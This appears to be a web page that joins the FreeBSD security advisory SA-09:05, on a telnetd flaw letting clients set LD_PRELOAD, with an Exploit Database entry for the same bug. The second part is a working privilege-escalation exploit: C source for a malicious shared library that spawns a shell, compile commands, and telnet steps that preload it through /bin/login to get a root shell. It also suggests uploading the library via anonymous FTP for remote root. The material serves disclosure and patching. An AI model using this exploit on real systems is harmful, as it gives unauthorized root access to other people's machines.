FreeBSD-SA-09:05.telnetd Security Advisory
The FreeBSD Project
Topic: telnetd code execution vulnerability
Category: core
Module: contrib
Announced: 2009-02-16
Affects: FreeBSD 7.x
Corrected: 2009-02-16 21:56:17 UTC (RELENG\_7, 7.1-STABLE)
2009-02-16 21:56:17 UTC (RELENG\_7\_1, 7.1-RELEASE-p3)
2009-02-16 21:56:17 UTC (RELENG\_7\_0, 7.0-RELEASE-p10)
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
The FreeBSD telnet daemon, telnetd(8), implements the server side of the
TELNET virtual terminal protocol. It has been disabled by default in
FreeBSD since August 2001, and due to the lack of cryptographic security
in the TELNET protocol, it is strongly recommended that the SSH protocol
be used instead. The FreeBSD telnet daemon can be enabled via the
/etc/inetd.conf configuration file and the inetd(8) daemon.
The TELNET protocol allows a connecting client to specify environment
variables which should be set in any created login session; this is used,
for example, to specify terminal settings.
II. Problem Description
In order to prevent environment variable based attacks, telnetd(8) "scrubs"
its environment; however, recent changes in FreeBSD's environment-handling
code rendered telnetd's scrubbing inoperative, thereby allowing potentially
harmful environment variables to be set.
III. Impact
An attacker who can place a specially-constructed file onto a target system
(either by legitimately logging into the system or by exploiting some other
service on the system) can execute arbitrary code with the privileges of
the user running the telnet daemon (usually root).
IV. Workaround
No workaround is available, but systems which are not running the telnet
daemon are not vulnerable.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to 7-STABLE, or to the RELENG\_7\_1 or
RELENG\_7\_0 security branch dated after the correction date.
2) To patch your present system:
The following patches have been verified to apply to FreeBSD 7.0 and 7.1
systems.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch http://security.FreeBSD.org/patches/SA-09:05/telnetd.patch
# fetch http://security.FreeBSD.org/patches/SA-09:05/telnetd.patch.asc
b) Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
# cd /usr/src/lib/libtelnet
# make obj && make depend && make
# cd /usr/src/libexec/telnetd
# make obj && make depend && make && make install

# FreeBSD 7.0-RELEASE - Telnet Daemon Privilege Escalation

#### EDB-ID:

###### 8055

**Vulnerable App:**

```
FreeBSD (7.0-RELEASE) telnet daemon local privilege escalation -
And possible remote root code excution.

There is a rather big bug in the current FreeBSD telnetd daemon.
The environment is not properly sanitized when execution /bin/login,
what leads to a (possible) remote root hole.

The telnet protocol allows to pass environment variables inside the
telnet traffic and assign them to the other side of the tcp connection.
The telnet daemon of FreeBSD does not check for LD_* (like LD_PRELOAD)
environment variables prior to executing /bin/login.
So passing an environment variable with the identifier LD_PRELOAD and
the value of a precompiled library that is on the filesystem of the
victims box that includes malicious code is possible.
When /bin/login is executed with the user id and group id 0 ('root') it preloads
the library that was set by remote connection through a telnet environment
definition and executes it.
It is unlikely that this bug can be exploited remotely but is not impossible.
An attacker could f.e. upload a malicious library using ftp (including anonymous
 ftp users), nfs, smb or any other (file) transfer protocol.
One scenario to exploit the bug remotely would be a ftp server running beside
the telnet daemon serving also anoynmous users with write access. Then the
attacker would upload the malicious library and defines the LD_PRELOAD
variable to something similar to /var/ftp/mallib.so to gain remote root access.

Here comes the actual exploit which can be executed with standard UNIX tools.
Paste this into a file using your favorite text editor:
---snip-----
# FreeBSD telnetd local/remote privilege escalation/code execution
# remote root only when accessible ftp or similar available
# tested on FreeBSD 7.0-RELEASE
# by Kingcope/2009

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        FILE *f;
        setenv("LD_PRELOAD", "", 1);
        system("echo ALEX-ALEX;/bin/sh");
}
---snip-----

Then we compile this stuff.

---snip-----
#gcc -o program.o -c program.c -fPIC
#gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
---snip-----

Then we copy the file to a known location (local root exploit)

---snip-----
#cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
---snip-----

...or we upload the library through any other available attack vector.
After that we telnet to the remote or local FreeBSD telnet daemon
with setting the LD_PRELOAD environment variable to the known location
as a telnet option before.

---snip-----
#telnet
>auth disable SRA
>environ define LD_PRELOAD /tmp/libno_ex.so.1.0
>open target
---snip-----
ALEX-ALEX
#ROOTSHELL

This will give us an immediate (probably remote) root shell.
This exploit is only verified on a FreeBSD 7.0-RELEASE fresh install
with telnetd enabled. Other version of FreeBSD may also be affected,
OpenBSD and NetBSD where not tested but MAY contain the same bug because
of historic reasons.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
